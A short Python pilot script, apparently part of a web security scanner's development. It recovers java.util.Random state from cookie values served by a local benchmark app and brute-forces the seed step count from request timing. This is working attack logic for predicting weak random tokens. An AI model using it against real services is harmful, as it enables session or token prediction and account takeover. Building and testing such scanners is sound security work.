#!/usr/bin/env python3
"""Pilot 5 — deep K-scan on the live target with full value dumps."""
import sys, time, json
sys.path.insert(0, '/home/z/my-project/build-v430')
from sentinel.core import Endpoint, Parameter, ParamLocation, ScopeRule, EventBus
from sentinel.http_engine import RequestEngine, RequestMutation
from sentinel import jrand
from sentinel.weakrand import WeakRandomPhase

BASE = "http://localhost:8080/benchmark"
SRC = "/home/z/my-project/tools/benchmark-src"
import yaml
_S = yaml.safe_load(open(SRC + "/data/openapi.yaml"))
PATHS = {p.rsplit("/", 1)[-1]: p for p in _S["paths"] if "/BenchmarkTest" in p}

eng = RequestEngine(scope=ScopeRule(allow_private=True), bus=EventBus("p5"), timeout=8)
ph = WeakRandomPhase(eng, EventBus("p5"))
ep = Endpoint(url=BASE + PATHS["BenchmarkTest00085"], method="POST")

samples = []
for i in range(8):
    t0 = time.monotonic_ns()
    c = ph._fetch_cookie(ep)
    t1 = time.monotonic_ns()
    if c:
        val = c[1].strip()
        st = jrand.recover_state_nextlong(jrand.parse_java_long(val))
        if st is not None:
            samples.append((val, jrand.seed_from_state(st), t0, t1))
        print(f"  s{i+1}: val={val} (len {len(val)}) recovered={'Y' if st else 'N'} rtt={(t1-t0)//100000/10}ms")

print("\nK-scan (K=1..48, t1 grid 500ns):")
C48 = jrand.UNIQ_MULT & jrand.MASK48
for i in range(len(samples) - 1):
    v1, s1, a1, b1 = samples[i]
    v2, s2, a2, b2 = samples[i + 1]
    hits = {}
    for t1 in range(a1, b1 + 1, 500):
        u1 = (s1 ^ (t1 & jrand.MASK48)) & jrand.MASK48
        u2 = u1
        for K in range(1, 49):
            u2 = (u2 * C48) & jrand.MASK48
            t2 = (s2 ^ u2) & jrand.MASK48
            if a2 <= t2 <= b2:
                hits[K] = hits.get(K, 0) + 1
    print(f"  pair {i+1}->{i+2}: K-hits = {dict(sorted(hits.items())[:6])} (span {b1-a1}ns/{b2-a2}ns)")
